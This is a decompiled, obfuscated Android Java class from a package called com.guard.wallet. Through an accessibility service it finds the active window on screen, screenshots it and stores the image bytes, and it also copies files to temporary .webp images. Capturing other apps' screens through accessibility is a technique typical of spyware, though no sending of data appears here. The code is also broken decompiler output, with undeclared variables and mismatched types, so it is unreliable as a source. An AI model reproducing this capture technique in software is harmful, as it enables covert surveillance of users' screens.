package com.guard.wallet.thread;

import a1.q;
import android.graphics.Bitmap;
import android.os.Build.VERSION;
import android.view.accessibility.AccessibilityWindowInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.TakeScreenShotResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Iterator;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicInteger;

public final class k implements Callable {
   public final int a;
   public final Object b;

   public k(Float var1) {
      this.a = 0;
      super();
      if (VERSION.SDK_INT >= 30) {
         this.b = new u.a(var1);
      }
   }

   public k(String var1) {
      this.a = 1;
      this.b = var1;
      super();
   }

   public k(boolean var1) {
      this.a = 0;
      super();
      if (VERSION.SDK_INT >= 30) {
         this.b = new u.a(var1);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final Object call() {
      int var1 = this.a;
      Iterator var6 = (Iterator)this.b;
      u.a var4 = null;
      AtomicInteger var5 = null;
      switch (var1) {
         case 0:
            TakeScreenShotResult var14 = var5;
            if (VERSION.SDK_INT >= 30) {
               var4 = (u.a)var6;
               var14 = var5;
               if (var4 != null) {
                  var14 = var5;
                  if (var4.b()) {
                     var14 = new TakeScreenShotResult();
                     if (MyAccessibilityService.P() != null) {
                        var5 = var4.a;
                        int var2 = 0;
                        var5.set(0);
                        var4.d = null;
                        MyAccessibilityService var19 = MyAccessibilityService.P();
                        var19.getClass();

                        label82: {
                           Exception var10000;
                           label93: {
                              try {
                                 var20 = var19.getWindows();
                              } catch (Exception var10) {
                                 var10000 = var10;
                                 boolean var10001 = false;
                                 break label93;
                              }

                              var1 = var2;
                              if (var20 == null) {
                                 break label82;
                              }

                              var1 = var2;

                              try {
                                 if (var20.isEmpty()) {
                                    break label82;
                                 }

                                 var6 = var20.iterator();
                              } catch (Exception var9) {
                                 var10000 = var9;
                                 boolean var24 = false;
                                 break label93;
                              }

                              while (true) {
                                 var1 = var2;

                                 try {
                                    if (!var6.hasNext()) {
                                       break label82;
                                    }

                                    var21 = (AccessibilityWindowInfo)var6.next();
                                 } catch (Exception var8) {
                                    var10000 = var8;
                                    boolean var25 = false;
                                    break;
                                 }

                                 if (var21 != null) {
                                    try {
                                       if (var21.isActive() && VERSION.SDK_INT >= 30) {
                                          var1 = a0.h.b(var21);
                                          break label82;
                                       }
                                    } catch (Exception var7) {
                                       var10000 = var7;
                                       boolean var26 = false;
                                       break;
                                    }
                                 }
                              }
                           }

                           Exception var22 = var10000;
                           q.s("MyAccessibilityService", var22);
                           var1 = var2;
                        }

                        var2 = var1;
                        if (var1 < 0) {
                           var2 = com.guard.wallet.utils.e.b;
                        }

                        MyAccessibilityService.P().takeScreenshot(var2, android.support.v4.view.a.n(MainApplication.getAppContext()), var4);

                        while (!var4.b()) {
                           com.guard.wallet.utils.g.T0(1);
                        }

                        var14.setSaveBytesResult(var4.d);
                        var14.setSaveFileResult(null);
                        var4.a.set(-1);
                        var4.d = null;
                     }
                  }
               }
            }

            return var14;
         default:
            var5 = com.guard.wallet.utils.g.i0();
            Bitmap var3 = var4;
            if (!q.B(var5)) {
               String var13 = "tmp-".concat(String.valueOf(System.currentTimeMillis())).concat(".webp");
               var5 = var5.concat("/").concat(var13);
               var3 = var4;
               if (p.b.b((String)var6, (String)var5)) {
                  var3 = q.J((String)var5);
               }
            }

            return var3;
      }
   }
}
